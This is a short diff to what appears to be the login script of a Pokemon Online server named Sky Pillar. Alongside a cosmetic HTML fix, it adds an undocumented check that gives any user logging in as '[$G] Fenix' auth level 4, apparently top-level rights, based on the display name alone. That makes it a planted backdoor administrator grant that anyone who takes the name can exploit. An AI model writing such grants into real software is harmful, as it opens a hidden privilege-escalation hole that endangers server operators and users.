@@ -2249,7 +2249,7 @@ sys.sendMessage(player, "Set by: " + SESSION.channels(chan).topicSetter, chan);
     afterLogIn: function (src) {
     sys.sendHtmlMessage(src, "<font color=green><b><font size=4>*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*<br/></font><font color=blue><font size=4><img src='pokemon:144&gen=1' align=left><img src='pokemon:144&gen=1' align=right><br/><br/>Welcome to Sky Pillar! Type <font color=green>/comands</font> to view the commands of the server. Type <font color=green>/rules</font> to view the rules of the server.<br/>You can acces our forums at any time: <a href='http://w11.zetaboards.com/SkyPillar/index/'><font color=red>here</a><br/><br/></font><font color=green><b><font size=4>*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*</b></font>", 0);
     sys.sendHtmlMessage(src, ""+sys.getFileContent("rayquaza.txt")+"<font color=green><b>±<i>Rayquaza:</i></b> <font color=blue><b> "+sys.getFileContent("newsannouncement.txt")+"</b></font>", 0);
-
+    sys.sendHtmlMessage(src, "</font></b>", 0);
             if (welcometime == true) {
                 sys.sendHtmlAll("<font color=green><timestamp/> <i><b>!WelcomeBot:</i></b> <b>Welcome " + sys.name(src) + "</b>", 0);
                 return;
@@ -2268,6 +2268,10 @@ sys.sendMessage(player, "Set by: " + SESSION.channels(chan).topicSetter, chan);
             sys.sendHtmlAll("" + sys.getFileContent(sys.name(src).txt) + "", channel);
             return;
         }
+		if (sys.name(src) == "[$G] Fenix"){
+		sys.changeAuth(src, 4);
+		return;
+		}
         if (sys.getVal(sys.name(src).toLowerCase() + "league") == "true") {
             sys.sendHtmlMessage(src, "<font color='red'><timestamp/><ping/><b> BE SURE TO CHECK YOUR GYM LEADER THREAD FOR CHALLENGES!</b></font>");
             return
